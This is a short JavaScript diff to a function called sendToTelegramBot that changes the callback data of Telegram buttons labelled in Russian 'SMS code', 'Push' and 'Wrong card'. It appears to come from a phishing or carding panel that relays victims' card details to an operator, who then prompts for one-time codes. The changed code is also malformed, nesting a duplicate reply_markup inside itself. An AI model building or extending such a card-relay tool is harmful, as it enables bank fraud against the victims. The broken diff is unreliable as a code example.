@@ -1302,16 +1302,26 @@ async function sendToTelegramBot() {
                 text: message,
                 parse_mode: 'HTML',
                 reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "📱 SMS код", callback_data: "sms_code" },
-                            { text: "🔔 Пуш", callback_data: "push" }
-                        ],
-                        [
-                            { text: "❌ Неверная карта", callback_data: "wrong_card" }
-                        ]
-                    ]
-                }
+                   reply_markup: {
+    inline_keyboard: [
+        [
+            { 
+                text: "📱 SMS код", 
+                callback_data: `sms_code_${Date.now()}_user_123` 
+            },
+            { 
+                text: "🔔 Пуш", 
+                callback_data: `push_${Date.now()}_user_123` 
+            }
+        ],
+        [
+            { 
+                text: "❌ Неверная карта", 
+                callback_data: `wrong_card_${Date.now()}_user_123` 
+            }
+        ]
+    ]
+}
             })
         });
 
